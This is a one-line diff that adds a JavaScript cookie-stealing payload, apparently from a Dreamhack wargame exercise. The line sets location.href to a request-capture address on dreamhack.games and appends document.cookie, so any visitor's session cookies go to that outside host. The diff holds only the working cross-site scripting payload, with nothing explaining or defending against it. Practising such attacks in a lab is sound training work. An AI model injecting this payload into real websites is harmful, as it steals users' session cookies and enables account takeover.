@@ -1,0 +1,1 @@
+location.href="https://tmlvpqs.request.dreamhack.games?c=" + document.cookie;
